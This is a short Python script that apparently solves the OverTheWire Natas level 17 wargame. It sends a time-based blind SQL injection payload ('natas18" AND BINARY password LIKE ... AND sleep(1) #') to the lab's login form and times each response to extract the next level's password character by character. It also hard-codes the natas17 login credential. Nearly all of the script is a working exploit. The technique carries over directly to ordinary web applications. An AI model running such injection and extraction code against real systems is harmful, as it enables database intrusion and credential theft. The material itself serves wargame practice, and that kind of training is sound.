import requests
import re
import string
from time import *
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

username ='natas17'
password ='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
seenpass = list()
while(len(seenpass)<32):
    for ch in characters:
        start_time = time()
        # print("start time is ",start_time)
        print("trying character =","".join(seenpass)+ch)
        responce = requests.post(url,data = {"username":'natas18" AND BINARY password LIKE "'+"".join(seenpass)+ch+'%" AND sleep(1) #'},auth = (username,password))
        
        content = responce.text 
        end_time = time()
        diff = end_time-start_time
        print("start time = ",start_time,"endtime is ",end_time,"difference is ",diff)
        returned = ()
        if diff>1.2826:
            print("got the character")
            seenpass.append(ch)
            break
print("password for natas 18 is = ","".join(seenpass))
